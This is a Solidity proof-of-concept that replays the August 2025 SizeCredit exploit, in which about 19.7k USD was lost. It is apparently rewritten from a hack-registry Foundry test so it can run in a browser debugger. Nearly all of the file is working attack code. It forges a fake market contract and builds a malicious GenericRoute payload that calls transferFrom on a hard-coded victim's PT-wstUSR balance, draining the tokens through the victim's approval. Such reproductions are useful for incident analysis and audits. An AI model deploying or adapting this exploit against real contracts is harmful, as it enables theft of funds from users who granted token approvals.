// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

// @KeyInfo - Total Lost : 19.7k USD
// Attacker : https://etherscan.io/address/0xa7e9b982b0e19a399bc737ca5346ef0ef12046da
// Attack Contract : https://etherscan.io/address/0xa6dc1fc33c03513a762cdf2810f163b9b0fd3a71
// Vulnerable Contract : https://etherscan.io/address/0xf4a21ac7e51d17a0e1c8b59f7a98bb7a97806f14
// Attack Tx : https://etherscan.io/tx/0xc7477d6a5c63b04d37a39038a28b4cbaa06beb167e390d55ad4a421dbe4067f8
//
// Vulnerable Contract Code : https://etherscan.io/address/0xf4a21ac7e51d17a0e1c8b59f7a98bb7a97806f14#code
//
// Rewritten standalone (no forge-std/Test inheritance) from the registry's
// Foundry PoC at evm-hack-registry/2025-08-SizeCredit_exp/test/SizeCredit_exp.sol
// so it can be replayed in the browser debugger's plain EVM (no cheatcodes).
// The attack logic is unchanged: this contract plays THREE roles simultaneously,
// exactly like `address(this)` did in the original Foundry test:
//   1. the caller of LeverageUp.leverageUpWithSwap(),
//   2. the forged `ISize size` market whose getters feed the guard checks, and
//   3. the recipient of the victim's drained PT-wstUSR (via GenericRoute's
//      unvalidated `router.call(data)` == transferFrom(victim, this, allowance)).

interface IERC20Min {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

address constant PT_WSTUSR = 0x23E60d1488525bf4685f53b3aa8E676c30321066;
address constant LEVERAGE_UP = 0xF4a21Ac7e51d17A0e1C8B59f7a98bb7A97806f14;
address constant VICTIM = 0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290;

contract SizeCredit {
    function testExploit() public {
        // Root cause: leverageUpWithSwap's GenericRoute swap branch executes an
        // attacker-controlled (router, calldata) pair via a raw `.call()` with
        // zero validation. Combined with LeverageUp never authenticating the
        // `size` market argument, an attacker can steer that call into
        // `victimToken.transferFrom(victim, attacker, allowance)`.
        IERC20Min wstUSR = IERC20Min(PT_WSTUSR);
        uint256 bal = wstUSR.balanceOf(VICTIM);
        uint256 allowance = wstUSR.allowance(VICTIM, LEVERAGE_UP);
        uint256 amount = bal;
        if (allowance < amount) {
            amount = allowance;
        }

        SellCreditMarketParams[] memory marketParams = new SellCreditMarketParams[](1);
        uint256 max = type(uint256).max;
        marketParams[0] = SellCreditMarketParams({
            lender: address(this),
            creditPositionId: max,
            amount: max,
            tenor: max,
            deadline: max,
            maxAPR: max,
            exactAmountIn: true
        });
        SwapParams[] memory swapParams = new SwapParams[](1);

        // Craft the malicious GenericRoute payload: router = the victim's
        // collateral token, data = transferFrom(victim, this, allowance).
        bytes memory inner = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            VICTIM,
            address(this),
            amount
        );
        bytes memory data = abi.encode(
            32,
            PT_WSTUSR,
            address(this),
            inner
        );

        // Manual ABI fixup: the hand-rolled abi.encode() above produces a
        // GenericRouteParams-shaped blob whose inner `bytes data` offset needs
        // to be corrected from 0x80 to 0x60 (not part of the bug - just a
        // hand-encoding quirk carried over from the original PoC).
        data[127] = hex"60";

        swapParams[0] = SwapParams({
            method: SwapMethod.GenericRoute,
            data: data
        });

        ILeverageUp(LEVERAGE_UP).leverageUpWithSwap(
            address(this),
            marketParams,
            address(this),
            0,
            1 ether,
            0,
            swapParams
        );
    }

    // --- forged `ISize` market getters, read by leverageUpWithSwap's guards ---

    function riskConfig() public view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        return (
            1 ether + 1,
            type(uint256).max,
            0,
            type(uint256).max,
            0,
            type(uint256).max
        );
    }

    function data() public returns (uint256, uint256, address, address, address, address, address, address) {
        return (
            type(uint256).max,
            type(uint256).max,
            PT_WSTUSR,
            address(this),
            address(this),
            address(this),
            address(this),
            address(this)
        );
    }

    function oracle() public returns (address, uint64) {
        return (address(this), uint64(0));
    }

    function getPrice() public returns (uint256) {
        return 1 ether;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return true;
    }

    function deposit(DepositParams memory param) public {}

    function balanceOf(address account) public view returns (uint256) {
        return 2;
    }

    function debtTokenAmountToCollateralTokenAmount(uint256 borrowATokenAmount) public view returns (uint256) {
        return 1;
    }
}

struct DepositParams {
    address token;
    uint256 amount;
    address to;
}

struct SellCreditMarketParams {
    address lender;
    uint256 creditPositionId;
    uint256 amount;
    uint256 tenor;
    uint256 deadline;
    uint256 maxAPR;
    bool exactAmountIn;
}

enum SwapMethod {
    OneInch,
    Unoswap,
    UniswapV2,
    UniswapV3,
    GenericRoute,
    BoringPtSeller,
    BuyPt
}

struct SwapParams {
    SwapMethod method;
    bytes data;
}

interface ILeverageUp {
    function leverageUpWithSwap(
        address size,
        SellCreditMarketParams[] memory sellCreditMarketParamsArray,
        address tokenIn,
        uint256 amount,
        uint256 leveragePercent,
        uint256 borrowPercent,
        SwapParams[] memory swapParamsArray
    ) external;
}
